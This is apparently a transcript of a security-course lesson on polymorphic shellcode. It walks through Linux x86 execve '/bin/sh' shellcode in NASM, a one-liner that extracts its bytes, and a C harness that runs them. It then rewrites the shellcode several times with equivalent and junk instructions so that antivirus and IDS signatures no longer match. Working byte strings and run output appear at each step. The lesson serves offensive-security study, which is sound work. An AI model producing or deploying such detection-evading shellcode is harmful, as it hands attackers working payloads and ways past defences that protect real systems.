#Polymorphism

Hello students! In this video we will talk about **polymorphism**.

Now before getting into what polymorphism is let's try understand
the need for it. If you see, for example, the `execve` shellcode and
you compare it with another `execve` shellcode examples on sites like
shell-storm you'll actually see that most of them look pretty alike.
And hence it's easy for AV and IDS systems to easily go ahead and
create a simple pattern matching algorithm to detect that shellcode.

Now, because the detection is simple if you just use the standard 
shellcode from any of these websites and the victim has any kind of
protection than definetely your attack may fail.

Now, of course you have encoding and encryption as well which makes 
things better but don't forget that decoder / decryptor stub however
small but also is prone to fingerprinting.

Now, imagine if this would possible: that our shellcode would look
different every time we create it, even functionality will be preserved
what I mean is semantically equivalent instructions. As you can clearly
imagine this would make detection very very difficult and this is 
exactly what polymorphism is.

Now, the origins of polymorphism actually started in 1992 when Dark
Avenger probably the first person who invented polymorphism and created
Dark Angel Mutation Engine (DAME) and you can read **phrack** article
issue 61 (url in students slides).

Now, what is the basic principle of creating polymorphic shellcode?
You need to replace existing instructions with equivalent ones so
that functionality is preserved. You can also add other garbage
instructions which don't change functionality in any way and this is
called "NOP Equivalents".

Based on this two principles let's trying create polymorphic version
of existing shellcode. So what I have is `execve-stack.nasm` file. This
is exactly what we've discussed before. Let me copy it to `poly.nasm`
and open it up.

```asm
global _start

section .text
_start:

        ; PUSH the first null dword
        xor eax, eax
        push eax

        ; PUSH //bin/sh (8 bytes)

        push 0x68732f2f
        push 0x6e69622f

        mov ebx, esp

        push eax
        mov edx, esp

        push ebx
        mov ecx, esp


        mov al, 11
        int 0x80
```

Let's get original shellcode

```
$ shellcode-dump.sh poly
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

and after that test it with `shellcode.c` to ensure that it works.
Ok, so now let me open up `poly.nasm` and let start messing around
with the instructions. 

Now, you are probably thinking the easiest thing to probably to 
fingerprint would be these two `push` instructions

```
        push 0x68732f2f
        push 0x6e69622f
```

Because this show some variation of `/bin/sh` with extra-slashes. And
if you look at most common available shellcode you will see the exact
same `push` patterns repeating again and again depending on specific
program you want to execute. The actual hex immediate values may be
different.

So, now let me go ahead and modify this in some intelligent way. So we
still want to push these values on the stack. Let see if we can do 
this in a slightly different way. So what I am going to do is let me
replace the `push` with `mov` instructions. What I am going to do is
after the `mov` on the stack we will set `esp` right by ourselves.
So let me do this

```asm
        mov dword [esp-4], 0x68732f2f
        mov dword [esp-8], 0x6e69622f

        ;push 0x68732f2f
        ;push 0x6e69622f
```

now I need to adjust the stack pointer so I could simply do this
by subtract instruction

```asm
        mov dword [esp-4], 0x68732f2f
        mov dword [esp-8], 0x6e69622f
        sub esp, 8
```

and all this simple arithmetic because the stack grows from high 
memory to low memory.

Let's go ahead assemble and link this and use `objdump` just to verify
that we don't have any NULLs in here.

```
$ objdump -d poly -M intel

poly:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	31 c0                	xor    eax,eax
 8048062:	50                   	push   eax
 8048063:	c7 44 24 fc 2f 2f 73 	mov    DWORD PTR [esp-0x4],0x68732f2f
 804806a:	68 
 804806b:	c7 44 24 f8 2f 62 69 	mov    DWORD PTR [esp-0x8],0x6e69622f
 8048072:	6e 
 8048073:	83 ec 08             	sub    esp,0x8
 8048076:	89 e3                	mov    ebx,esp
 8048078:	50                   	push   eax
 8048079:	89 e2                	mov    edx,esp
 804807b:	53                   	push   ebx
 804807c:	89 e1                	mov    ecx,esp
 804807e:	b0 0b                	mov    al,0xb
 8048080:	cd 80                	int    0x80
```

Ok, so if you notice there are no NULLs. Now, notice something 
iteresting. In this case the number of opcodes in this line is 7

```
8048063:   c7 44 24 fc 2f 2f 73    mov    DWORD PTR [esp-0x4],0x68732f2f
```

while in our `cut` here

```
objdump -d $1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

we only allow 6. So this is real example of how tools can fail if you
not aware of what they are really doing. Let's set it to 7 in this
case

```
objdump -d $1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

```
$ shellcode-dump.sh poly
"\x31\xc0\x50\xc7\x44\x24\xfc\x2f\x2f\x73\x68\xc7\x44\x24\xf8\x2f\x62\x69\x6e\x83\xec\x08\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

open `shellcode.c` and paste it

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\xc7\x44\x24\xfc\x2f\x2f\x73\x68\xc7\x44\x24\xf8\x2f\x62\x69\x6e\x83\xec\x08\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```

now let's compile it

```
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

and let's run it

```
$ ./shellcode 
Shellcode Length:  34
$ 
$ 
$ 
```

and fantastic. we now have again `/bin/sh` shellcode where the `push`
instructions have been replaced. Of course, if you notice basically
we have an increased shellcode length. it's 34 from 25. Let's go
to `poly.nasm` if we can complicate things further.

```asm
global _start

section .text
_start:

        ; PUSH the first null dword
        xor eax, eax
        push eax

;       mov dword [esp-4], 0x68732f2f
        mov esi, 0x57621e1e
        add esi, 0x11111111
        mov dword [esp-4], esi

        mov dword [esp-8], 0x6e69622f
        sub esp, 8
```

Now this one instruction

```
mov dword [esp-4], 0x68732f2f
```

has been expanded to these three

```
        mov esi, 0x57621e1e
        add esi, 0x11111111
        mov dword [esp-4], esi
```

And let me follow the exact same process

```
$ nasm -f elf32 poly.nasm
$ ld -o poly  poly.o
$ shellcode-dump.sh poly
"\x31\xc0\x50\xbe\x1e\x1e\x62\x57\x81\xc6\x11\x11\x11\x11\x89\x74\x24\xfc\xc7\x44\x24\xf8\x2f\x62\x69\x6e\x83\xec\x08\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

and insert it into `shellcode.c`, compile it and run

```
$ ./shellcode 
Shellcode Length:  41
$ 
$ 
$ 
```

there we go. So depending on how you write your polymorphic code the
size can increase or decrease. Typically it's a good idea to look at
instructions which should end up decreasing the size. Now you could
as an example you can change this two instructions as well

```
        xor eax, eax
        push eax
```

to

```
;       xor eax, eax
        mov ebx, eax
        xor eax, ebx

;       push eax
        mov dword [esp-4], eax
        sub esp, 4
```

Now, all of we've looked at currently changes the instructions we are
using by preserving functionality. You could also add instructions
with make nosense, as an example

```asm
;       mov dword [esp-4], 0x68732f2f
        cld
        mov esi, 0x57621e1e
        add esi, 0x11111111
        mov dword [esp-4], esi
        std
```

you can not using it but it adds to the fact that our output code 
would now look very very different. Now also assemble and link it
and get shellcode

```
$ shellcode-dump.sh poly
"\x89\xc3\x31\xd8\x89\x44\x24\xfc\x83\xec\x04\xfc\xbe\x1e\x1e\x62\x57\x81\xc6\x11\x11\x11\x11\x89\x74\x24\xfc\xfd\xc7\x44\x24\xf8\x2f\x62\x69\x6e\x83\xec\x08\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

paste it to `shellcode.c`, compile it and run

```
$ ./shellcode 
Shellcode Length:  51
$ 
$ 
$ 
$ 
```

so we've added a ton of changes, the casuality, of course, leads that
shellcode size increases.

Now, this is exactly what I did right now in a very manual way and
what **polymorphic engine** would do in automatic way.

Writing your own polymorphic engine is more depth exercise. And I 
would really say in most cases you can just hand-craft your own
polymorphic engine and use it to produce shellcode in mass way
with a specific polymorphic engine you have written.



